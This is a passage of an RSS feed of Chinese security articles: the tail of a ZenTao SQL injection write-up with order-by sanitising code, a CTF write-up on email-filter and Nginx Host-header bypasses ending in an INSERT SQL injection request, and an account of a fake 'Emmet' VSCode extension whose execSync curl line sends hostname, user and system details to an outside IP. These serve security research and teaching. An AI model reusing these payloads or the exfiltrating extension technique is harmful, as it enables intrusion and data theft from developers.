最后的shell地址是\zentaopro\module\api\aaaaaa.php&lt;/code&gt;&lt;p&gt;但是问题又来了，前面报错里面得到的路径目录感觉像是做了权限（这里绕弯了，路径少加了一个www，所以以为是没权限写），最终从数据库中的&lt;code class=&quot;inline&quot;&gt;zt_file&lt;/code&gt;获取上传文件的路径，然后再将shell写入当中才得以结束。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;对于&lt;code class=&quot;inline&quot;&gt;order by&lt;/code&gt;的漏洞如何进行防御的时候，我觉得上面代码在部分上有可取之处。&lt;/p&gt;&lt;p&gt;1、去掉&lt;code class=&quot;inline&quot;&gt;limit&lt;/code&gt;部分，然后限制格式&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;if(!preg_match(&#39;/^(\w+\.)?(`\w+`|\w+)( +(desc|asc))?( *(, *(\w+\.)?(`\w+`|\w+)( +(desc|asc))?)?)*$/i&#39;, $orders)) die(&quot;Order is bad request, The order is $orders&quot;);&lt;/code&gt;&lt;p&gt;2、然后循环对每个字段进行反引号的添加&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;$orders = explode(&#39;,&#39;, $orders);
foreach ($orders as $i =&amp;gt; $order) {
	$orderParse = explode(&#39; &#39;, trim($order));
	foreach ($orderParse as $key =&amp;gt; $value) {
		$value = trim($value);
		if (empty($value) or strtolower($value) == &#39;desc&#39; or strtolower($value) == &#39;asc&#39;) {
			continue;
		}

		$field = $value;
		/* such as t1.id field. */
		if (strpos($value, &#39;.&#39;) !== false) {
			list($table, $field) = explode(&#39;.&#39;, $field);
		}

		if (strpos($field, &#39;`&#39;) === false) {
			$field = &quot;`$field`&quot;;
		}

		$orderParse[$key] = isset($table) ? $table . &#39;.&#39; . $field : $field;
		unset($table);
	}
	$orders[$i] = join(&#39; &#39;, $orderParse);
	if (empty($orders[$i])) {
		unset($orders[$i]);
	}

}&lt;/code&gt;&lt;p&gt;整个过程就是自己在挖莫名其妙的坑，然后再一个个慢慢补上，希望能够对大家有用。&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-03-07-34275981</guid>
<pubDate>Wed, 07 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>攻击LNMP架构Web应用的几个小Tricks</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-02-22-33919193.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/33919193&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-bc88b00f982a8df093427c8b8ea7e535_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hash=&quot;6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hovercard=&quot;p$b$6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@周佩雨&lt;/a&gt; &lt;/p&gt;&lt;p&gt;[ Phith0n，现就职于长亭科技，长期关注并笔耕于安全编码、代码审计等方向]&lt;/p&gt;&lt;p&gt;农历新年初一，我在&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/code-auditor-secret-group.html&quot;&gt;代码审计知识星球&lt;/a&gt;分享了一个红包，但领取红包的条件是破解我出的一道代码审计相关题目，题干如下：&lt;/p&gt;&lt;blockquote&gt;&lt;a href=&quot;http://2018.mhz.pw:62231&quot;&gt;2018.mhz.pw:62231&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01  拉取源码&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;题干比较简单，我们用浏览器打开，发现提示&lt;code class=&quot;inline&quot;&gt;ERR_INVALID_HTTP_RESPONSE&lt;/code&gt;，说明这个端口并非HTTP服务。用nmap进行端口指纹识别：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;nmap -sV -p 62231 2018.mhz.pw&lt;/code&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2fd8d5219cac4c784a0e26ffe4df8048_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;213&quot;&gt;&lt;p&gt;可见，这是一个rsync服务，我们使用rsync命令查看目录，发现只有一个目录，名为&lt;code class=&quot;inline&quot;&gt;pwnhub_6670.git&lt;/code&gt;，将其拉取下来：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a11e4589088c3480df25b50cac8ca294_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;367&quot;&gt;&lt;p&gt;查看&lt;code class=&quot;inline&quot;&gt;pwnhub_6670.git&lt;/code&gt;目录，发现这是一个git裸仓库（&lt;a href=&quot;http://www.saintsjd.com/2011/01/what-is-a-bare-git-repository/&quot;&gt;git bare repository&lt;/a&gt;）。&lt;/p&gt;&lt;p&gt;Git裸仓库怎么还原呢？其实非常简单，我们平时用的Github、Gitlab上存的所有仓库其实都是裸仓库，比如我们拉取vulhub的源码，执行&lt;code class=&quot;inline&quot;&gt;git clone https://github.com/vulhub/vulhub.git&lt;/code&gt;，其中&lt;code class=&quot;inline&quot;&gt;vulhub.git&lt;/code&gt;其实就是Github服务器上的一个裸仓库。可见，裸仓库一般以”项目名称.git“为名。&lt;/p&gt;&lt;p&gt;Git支持通过本地文件、SSH、HTTPS或GIT协议拉取信息。我们既然已经用rsync将裸仓库下载到本地了，所以只需要&lt;code class=&quot;inline&quot;&gt;git clone pwnhub_6670.git&lt;/code&gt;即可将裸仓库拉取下来，成为一个标准的仓库：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-e9119014ab77117e4fdadc453c307251_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;405&quot;&gt;&lt;p&gt;仓库&lt;code class=&quot;inline&quot;&gt;pwnhub_6670&lt;/code&gt;文件夹下的内容就是我们需要审计的源代码。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x02  SQL注入漏洞挖掘&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;作为一个出题人，我耍了点小阳谋。我用了一个叫&lt;a href=&quot;https://github.com/SpeedPHP/speed&quot;&gt;speed&lt;/a&gt;的小众PHP框架，但改了核心文件名为&lt;code class=&quot;inline&quot;&gt;core.php&lt;/code&gt;。就是为了防止大家去找这个框架本身的漏洞导致走偏方向，所有有漏洞的代码都出在我写的代码中。&lt;/p&gt;&lt;p&gt;拿到源码仓库，第一步先看看&lt;code class=&quot;inline&quot;&gt;git log&lt;/code&gt;和branch、tags等信息，也许会暴漏一些目标的敏感信息。这里没有，于是我们就应该把目标放向代码本身。&lt;/p&gt;&lt;p&gt;目标网站&lt;code class=&quot;inline&quot;&gt;http://2018.mhz.pw&lt;/code&gt;只有简单的注册、登录功能，有关输入的代码如下：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;?php
escape($_REQUEST);
escape($_POST);
escape($_GET);

function escape(&amp;amp;$arg) {
    if(is_array($arg)) {
        foreach ($arg as &amp;amp;$value) {
            escape($value);
        }
    } else {
        $arg = str_replace([&quot;&#39;&quot;, &#39;\\&#39;, &#39;(&#39;, &#39;)&#39;], [&quot;‘&quot;, &#39;\\\\&#39;, &#39;（&#39;, &#39;）&#39;], $arg);
    }
}

function arg($name, $default = null, $trim = false) {
    if (isset($_REQUEST[$name])) {
        $arg = $_REQUEST[$name];
    } elseif (isset($_SERVER[$name])) {
        $arg = $_SERVER[$name];
    } else {
        $arg = $default;
    }
    if($trim) {
        $arg = trim($arg);
    }
    return $arg;
}&lt;/code&gt;&lt;p&gt;escape是将GPR中的单引号、圆括号转换成中文符号，反斜线进行转义；arg是获取用户输入的&lt;code class=&quot;inline&quot;&gt;$_REQUEST&lt;/code&gt;或&lt;code class=&quot;inline&quot;&gt;$_SERVER&lt;/code&gt;。显然，这里&lt;code class=&quot;inline&quot;&gt;$_SERVER&lt;/code&gt;变量没有经过转义，先记下这个点。&lt;/p&gt;&lt;p&gt;全局没其他值得注意的地方了，所以开始看controller的代码。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;?php
function actionRegister(){
    if ($_POST) {
        $username = arg(&#39;username&#39;);
        $password = arg(&#39;password&#39;);

        if (empty($username) || empty($password)) {
            $this-&amp;gt;error(&#39;Username or password is empty.&#39;);
        }

        $email = arg(&#39;email&#39;);
        if (empty($email)) {
            $email = $username . &#39;@&#39; . arg(&#39;HTTP_HOST&#39;);
        }

        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $this-&amp;gt;error(&#39;Email error.&#39;);
        }

        $user = new User();
        $data = $user-&amp;gt;query(&quot;SELECT * FROM `{$user-&amp;gt;table_name}` WHERE `username` = &#39;{$username}&#39;&quot;);
        if ($data) {
            $this-&amp;gt;error(&#39;This username is exists.&#39;);
        }

        $ret = $user-&amp;gt;create([
            &#39;username&#39; =&amp;gt; $username,
            &#39;password&#39; =&amp;gt; md5($password),
            &#39;email&#39; =&amp;gt; $email
        ]);
        if ($ret) {
            $_SESSION[&#39;user_id&#39;] = $user-&amp;gt;lastInsertId();
        } else {
            $this-&amp;gt;error(&#39;Unknown error.&#39;);
        }
    }

}&lt;/code&gt;&lt;p&gt;以上是注册功能的代码，比较简单。用户名和密码是必填项，邮箱如果没有填写，则自动设置为”用户名@网站域名“。最后将三者传入create方法，create方法其实就是拼接了一个INSERT语句。&lt;/p&gt;&lt;p&gt;值得注意的是，网站域名是从&lt;code class=&quot;inline&quot;&gt;arg(&#39;HTTP_HOST&#39;)&lt;/code&gt;中获取，也就是从&lt;code class=&quot;inline&quot;&gt;$_REQUEST&lt;/code&gt;或&lt;code class=&quot;inline&quot;&gt;$_SERVER&lt;/code&gt;中获取。因为&lt;code class=&quot;inline&quot;&gt;$_SERVER&lt;/code&gt;没有经过转义，我们只需要在HTTP头Host值中引入单引号，即可造成一个SQL注入漏洞。&lt;/p&gt;&lt;p&gt;但email变量经过了&lt;code class=&quot;inline&quot;&gt;filter_var($email, FILTER_VALIDATE_EMAIL)&lt;/code&gt;的检测，我们首先要绕过之。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x03  FILTER_VALIDATE_EMAIL 绕过 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这就是今天第一个trick。这个点早在当初PHPMailer的&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/PHPMailer-CVE-2016-10033.html&quot;&gt;CVE-2016-10033&lt;/a&gt;就提到过。&lt;/p&gt;&lt;p&gt;RFC 3696规定，邮箱地址分为local part和domain part两部分。local part中包含特殊字符，需要如下处理：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;将特殊字符用&lt;code class=&quot;inline&quot;&gt;\&lt;/code&gt;转义，如&lt;code class=&quot;inline&quot;&gt;Joe\&#39;Blow@example.com&lt;/code&gt;&lt;/li&gt;&lt;li&gt;或将local part包裹在双引号中，如&lt;code class=&quot;inline&quot;&gt;&quot;Joe&#39;Blow&quot;@example.com&lt;/code&gt;&lt;/li&gt;&lt;li&gt;local part长度不超过64个字符&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;虽然PHP没有完全按照RFC 3696进行检测，但支持上述第2种写法。所以，我们可以利用之绕过&lt;code class=&quot;inline&quot;&gt;FILTER_VALIDATE_EMAIL&lt;/code&gt;的检测。&lt;/p&gt;&lt;p&gt;因为代码中邮箱是用户名、@、Host三者拼接而成，但用户名是经过了转义的，所以单引号只能放在Host中。我们可以传入用户名为&lt;code class=&quot;inline&quot;&gt;&quot;&lt;/code&gt;，Host为&lt;code class=&quot;inline&quot;&gt;aaa&#39;&quot;@example.com&lt;/code&gt;，最后拼接出来的邮箱为&lt;code class=&quot;inline&quot;&gt;&quot;@aaa&#39;&quot;@example.com&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;这个邮箱是合法的：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2c3ebaa43d148bcb1077ef794875179a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;374&quot;&gt;&lt;p&gt;这个邮箱包含单引号，将闭合SQL语句中原本的单引号，造成SQL注入漏洞。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x04  绕过 Nginx Host 限制&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这是今天第二个trick。&lt;/p&gt;&lt;p&gt;我们尝试向目标注册页面发送刚才构造好的用户名和Host：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-036f8b0da6617ec28407606900723755_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;204&quot;&gt;&lt;p&gt;直接显示404，似乎并没有进入PHP的处理过程。&lt;/p&gt;&lt;p&gt;这就回到问题的本质了，Host头究竟是做什么的？&lt;/p&gt;&lt;p&gt;众所周知，如果我们在浏览器里输入&lt;code class=&quot;inline&quot;&gt;http://2018.mhz.pw&lt;/code&gt;，浏览器将先请求DNS服务器，获取到目标服务器的IP地址，之后的TCP通信将和域名没有关系。那么，如果一个服务器上有多个网站，那么Nginx在接收到HTTP包后，将如何区分？&lt;/p&gt;&lt;p&gt;这就是Host的作用：用来区分用户访问的究竟是哪个网站（在Nginx中就是Server块）。&lt;/p&gt;&lt;p&gt;如果Nginx发现我们传入的Host找不到对应的Server块，将会发送给默认的Server块，也就是我们通过IP地址直接访问的那个Nginx默认页面：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-29368ce91ff8f4dd421ce72682e427e8_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;244&quot;&gt;&lt;p&gt;默认网站并没有&lt;code class=&quot;inline&quot;&gt;/main/register&lt;/code&gt;这个请求的处理方法，所以自然会返回404。&lt;/p&gt;&lt;p&gt;这里给出解决这个问题的两个方法，也许还有更多新方法我没有想到，欢迎补充。&lt;/p&gt;&lt;p&gt;&lt;b&gt;法1&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Nginx在处理Host的时候，会将Host用冒号分割成hostname和port，port部分被丢弃。所以，我们可以设置Host的值为&lt;code class=&quot;inline&quot;&gt;2018.mhz.pw:xxx&#39;&quot;@example.com&lt;/code&gt;，这样就能访问到目标Server块&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7e9214ed2dd45bb78f1f021ce22714cc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;229&quot;&gt;&lt;p&gt;如上图，成功触发SQL报错。&lt;/p&gt;&lt;p&gt;&lt;b&gt;法2&lt;/b&gt;&lt;/p&gt;&lt;p&gt;当我们传入两个Host头的时候，Nginx将以第一个为准，而PHP-FPM将以第二个为准。&lt;/p&gt;&lt;p&gt;也就是说，如果我传入：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Host: 2018.mhz.pw
Host: xxx&#39;&quot;@example.com&lt;/code&gt;&lt;p&gt;Nginx将认为Host为&lt;code class=&quot;inline&quot;&gt;2018.mhz.pw&lt;/code&gt;，并交给目标Server块处理；但PHP中使用&lt;code class=&quot;inline&quot;&gt;$_SERVER[&#39;HTTP_HOST&#39;]&lt;/code&gt;取到的值却是&lt;code class=&quot;inline&quot;&gt;xxx&#39;&quot;@example.com&lt;/code&gt;。这样也可以绕过：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-b58641bf79aa32b94998873424102a2b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;225&quot;&gt;&lt;p&gt;这个方法我以前在某群里提到过，只有Nginx+PHP会出现这个问题，Apache的情况下将会是另一个样子，此处不展开讨论。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x05  Mysql 5.7 INSERT注入方法&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;这是今天第三个trick。&lt;/p&gt;&lt;p&gt;既然已经触发了SQL报错，说明SQL注入近在眼前。通过阅读源码中包含的SQL结构，我们知道flag在flags表中，所以不废话，直接注入读取该表。&lt;/p&gt;&lt;p&gt;&lt;b&gt;插入显示位&lt;/b&gt;&lt;/p&gt;&lt;p&gt;因为用户成功登录后，将会显示出该用户的邮箱地址，所以我们可以将数据插入到这个位置。发送如下数据包：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;POST /main/register HTTP/1.1
Host: 2018.mhz.pw
Host: &#39;),(&#39;t123&#39;,md5(12123),(select(flag)from(flags)))#&quot;@a.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: multipart/form-data; boundary=--------356678531
Content-Length: 176

----------356678531
Content-Disposition: form-data; name=&quot;username&quot;

&quot;a
----------356678531
Content-Disposition: form-data; name=&quot;password&quot;

aaa
----------356678531--&lt;/code&gt;&lt;p&gt;可见，我闭合了INSERT语句，并插入了一个新用户&lt;code class=&quot;inline&quot;&gt;t123&lt;/code&gt;，并将flag读取到email字段。登录该用户，获取flag：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-47fe38613349c23e629dd7964162fceb_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;245&quot;&gt;&lt;p&gt;flag是支付宝红包口令。:)&lt;/p&gt;&lt;p&gt;&lt;b&gt;报错注入&lt;/b&gt;&lt;/p&gt;&lt;p&gt;为了降低难度，我特地给出了Mysql的报错信息，没想到居然还增加了难度，这一点我没考虑到，还是 @burnegg 同学提出来的解决方法。&lt;/p&gt;&lt;p&gt;很多同学上来就测试报错注入，但这里有两个需要绕过的坑：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;由于邮箱的限制，注入语句长度需要小于64位&lt;/li&gt;&lt;li&gt;Mysql 5.7 默认开启严格模式，部分字符串连接语法将导致错误：&lt;code class=&quot;inline&quot;&gt;ErrorInfo: Truncated incorrect INTEGER value&lt;/code&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;我们可以不使用字符串连接语法，而使用&lt;code class=&quot;inline&quot;&gt;&amp;lt;&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;&amp;gt;&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;=&lt;/code&gt;等比较符号来触发漏洞：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-27c7003ec97ae50df5a33d57dd11ff6f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;650&quot; data-rawheight=&quot;252&quot;&gt;&lt;p&gt;更多INSERT注入相关内容，可以阅读&lt;a href=&quot;https://www.exploit-db.com/docs/english/41275-mysql-injection-in-update,-insert,-and-delete.pdf&quot;&gt;MySQL Injection in Update, Insert and Delete&lt;/a&gt;。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x06  一个总结&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;题目出出来以后，有千余同学参加，最快拿到支付宝红包的是 @超威蓝猫 ，大概在初二凌晨1点。&lt;/p&gt;&lt;p&gt;除了安全研究者以外，有一些程序员同学也参与了游戏，但因为不熟悉CTF比赛和安全相关漏洞，所以有的人跑偏了，没有聚焦在漏洞和安全技术本身，而去猜测红包口令是否藏在图片或者其他什么地方。&lt;/p&gt;&lt;p&gt;希望这次游戏给你带来不仅是过年的欢乐，而且有技术的提升~&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;本文为授权转载，原文链接：&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/some-tricks-of-attacking-lnmp-web-application.html&quot;&gt;攻击LNMP架构Web应用的几个小Tricks | 离别歌&lt;/a&gt;&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2018-02-22-33919193</guid>
<pubDate>Thu, 22 Feb 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>VSCODE EXTENSION 钓鱼</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-01-23-33203374.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/33203374&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-3f98183e24f6e09f4c4470311dcc1754_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：&lt;/b&gt;&lt;a href=&quot;https://www.zhihu.com/people/D0n9&quot;&gt;栋栋的栋&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;灵感来源于 fate0 这篇 &lt;a href=&quot;http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&amp;amp;isappinstalled=0&quot;&gt;Package 钓鱼&lt;/a&gt;&lt;/p&gt;&lt;p&gt;随想做一次针对开发者的“钓鱼”实验，编程语言模块库的钓鱼实验fate0和ztz已经做过了，所以这次把实验对象选择编辑器(IDE)&lt;/p&gt;&lt;p&gt;5$买了一台廉价vps用作收集用户数据，收集以下信息。&lt;/p&gt;&lt;p&gt;· hostname&lt;/p&gt;&lt;p&gt;· whoami&lt;/p&gt;&lt;p&gt;· date&lt;/p&gt;&lt;p&gt;· uname&lt;/p&gt;&lt;p&gt;· ip&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;mysql&amp;gt; desc db;
+----------+-----------------+------+-----+---------+----------------+
| Field    | Type            | Null | Key | Default | Extra          |
+----------+-----------------+------+-----+---------+----------------+
| id       | int(4) unsigned | NO   | PRI | NULL    | auto_increment |
| hostname | varchar(32)     | NO   |     | NULL    |                |
| whoami   | varchar(32)     | NO   |     | NULL    |                |
| date     | varchar(32)     | NO   |     | NULL    |                |
| uname    | varchar(32)     | NO   |     | NULL    |                |
| ide      | varchar(32)     | NO   |     | NULL    |                |
| ip       | varchar(32)     | NO   |     | NULL    |                |
+----------+-----------------+------+-----+---------+----------------+&lt;/code&gt;&lt;p&gt;获取ip方式使用$_SERVER[“REMOTE_ADDR”]; 所以可能会不准确。&lt;/p&gt;&lt;p&gt;好了，回到主题&lt;/p&gt;&lt;p&gt;选择制作Visual Studio Code的“恶意”插件，需要用到的工具是 Yeoman 和 vsce&lt;/p&gt;&lt;blockquote&gt;&lt;i&gt;npm install -g yo generator-code&lt;br&gt;npm install -g vsce&lt;/i&gt;&lt;/blockquote&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f1818729f547600a35585b5d658ebbb6_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;999&quot; data-rawheight=&quot;608&quot;&gt;&lt;p&gt;选择TypeScript语言作为插件的代码语言，可以导入Node.js进程通信模块&lt;b&gt;import { execSync } from ‘child_process’;&lt;/b&gt;，就可以使用exec() execSync() 执行命令&lt;/p&gt;&lt;p&gt;./test/src/extension.ts&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;execSync(&#39;curl &quot;http://45.32.40.141/&quot; --user-agent &quot;$(echo `hostname`, `whoami`, `date &quot;+%Y-%m-%d %H:%M:%S&quot;`, `uname`, vscode | base64)&quot;&#39;)&lt;/code&gt;&lt;p&gt;执行curl命令外带出数据，有个不足没有考虑Windows系统，这也是导致了最后插件安装量很大但是实际有效数据不多的原因。&lt;/p&gt;&lt;p&gt;考虑再三还是把命令硬编码在代码里，因为只是一次实验，如果下发脚本的方式就会被当作真的是恶意程序&lt;/p&gt;&lt;p&gt;还有一个知识点，vscode启动默认是不加载插件的，这是因为官方考虑到加载插件会拖慢启动速度，只有设置触发条件才会启动&lt;/p&gt;&lt;p&gt;./test/src/package.json&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&quot;activationEvents&quot;: [
    &quot;onCommand:extension.sayHello&quot;
],&lt;/code&gt;&lt;p&gt;改为&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&quot;activationEvents&quot;: [
    &quot;*&quot;,
    &quot;onCommand:extension.sayHello&quot;
],&lt;/code&gt;&lt;p&gt;星号表示任何情况下都会触发，就这么简单，一个恶意的插件就做好了，当然为了使之更加逼真还要增加一些迷惑性的内容，比如README.md最好图文并茂，再给插件设置一张icon，就可以上传到 &lt;a href=&quot;https://marketplace.visualstudio.com/&quot;&gt;https://marketplace.visualstudio.com&lt;/a&gt; 了，几分钟就审核通过，那肯定是自动审核了&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8f0de38638fb609bf3735f425e179965_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1208&quot; data-rawheight=&quot;429&quot;&gt;&lt;p&gt;可能是因为Emmet知名度太高（用过sublime的小伙伴肯定知道这个插件）”恶意“插件上架仅两天就有了二十九万的安装量，后来发现竟然还上了首页热门推荐，这是意想不到的，起初还在担心如果不可控了咋办，最后证明这个担心是多余的，XDD&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-6330c09e78724f67db3c0f13db34b574_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1276&quot; data-rawheight=&quot;1026&quot;&gt;&lt;p&gt;当然也不是那么顺利，因为插件并没有实际功能，还是被几位外国人识破举报了，周二一早就被官方下架了，从周六到周二仅持续了三天时间，相信如果是在正常插件中加入恶意代码肯定会潜伏更长更不易被发现。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-968dacc3cca8dc97dde549349fb499b1_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1159&quot; data-rawheight=&quot;667&quot;&gt;&lt;p&gt;但是在下架的时候已经有了367004次的安装量 &lt;a href=&quot;https://marketplace.visualstudio.com/items?itemName=visualstuiocode.emmet#overview&quot;&gt;https://marketplace.visualstudio.com/items?itemName=visualstuiocode.emmet#overview&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0fb4230a609ecb4db8c78fd7f6bbfe41_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1199&quot; data-rawheight=&quot;221&quot;&gt;&lt;p&gt;因为每次启动都会加载插件执行命令，所以上报的数据需要去重，hostname 加 whoami hash 后当作 uid 去重统计操作系统占比，可以看出other数量最多，这部分可能是Windows或是其他原因没有上报数据&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-8b0a1f77ef8df9edb87919641741b58e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1031&quot; data-rawheight=&quot;907&quot;&gt;&lt;p&gt;中招最多的国家top10，数据验证使用 &lt;a href=&quot;http://ip.taobao.com/service/getIpInfo.php&quot;&gt;http://ip.taobao.com/service/getIpInfo.php&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-2fee8d69e9c4468a38c6a993c61e609c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1624&quot; data-rawheight=&quot;979&quot;&gt;&lt;p&gt;思考，是什么原因导致三天达到三十几万的安装量呢？&lt;/p&gt;&lt;p&gt;这个锅官方是背定了，因为官方审核机制不严格，spam 不及时，甚至还登上了首页热门推荐两天才导致大量安装，后续没有补救措施，对于已经安装了恶意插件的用户没有提示告知，只对插件做了下架处理，原本已经安装的用户还是会受影响。&lt;/p&gt;&lt;p&gt;ide有那么多，sublime 是使用Python写插件，JetBrains家和Eclipse用Java，Notepad++用c++，都可以按照类似思路构造出恶意插件。&lt;/p&gt;&lt;p&gt;未来会不会再出现xcodeghost事件呢？拭目以待。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;ref：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://zh.wikipedia.org/wiki/XcodeGhost%E9%A3%8E%E6%B3%A2&quot;&gt;https://zh.wikipedia.org/wiki/XcodeGhost%E9%A3%8E%E6%B3%A2&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://imzc.me/tools/2016/10/13/getting-started-with-vscode-ext/&quot;&gt;http://imzc.me/tools/2016/10/13/getting-started-with-vscode-ext/&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://code.visualstudio.com/docs/extensions/overview&quot;&gt;https://code.visualstudio.com/docs/extensions/overview&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://nodejs.cn/api/child_process.html&quot;&gt;http://nodejs.cn/api/child_process.html&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&amp;amp;isappinstalled=0&quot;&gt;http://blog.fatezero.org/2017/06/01/package-fishing/?from=groupmessage&amp;amp;isappinstalled=0&lt;/a&gt;&lt;/p&gt;</description>
